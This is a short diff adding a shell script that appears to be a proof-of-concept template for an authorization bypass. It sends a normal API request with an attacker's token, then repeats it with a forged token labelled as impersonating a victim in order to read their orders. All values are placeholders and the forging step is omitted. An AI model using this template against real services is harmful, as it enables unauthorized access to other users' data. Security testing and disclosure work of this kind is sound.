@@ -1,1 +1,19 @@
-ddddd
+# Set variables
+export API="YOUR_API_URL"
+export TOKEN_B="ATTACKER_TOKEN"
+export TOKEN_C="VICTIM_TOKEN"
+
+# Test normal behavior
+curl -s "$API" \
+-H "content-type: application/json" \
+-H "authorization: $TOKEN_B" \
+--data-raw '{"action":"orders"}' | jq
+
+# Forge token (result stored manually)
+export FAKE_AS_C="FORGED_TOKEN"
+
+# Exploit
+curl -s "$API" \
+-H "content-type: application/json" \
+-H "authorization: $FAKE_AS_C" \
+--data-raw '{"action":"orders"}' | jq
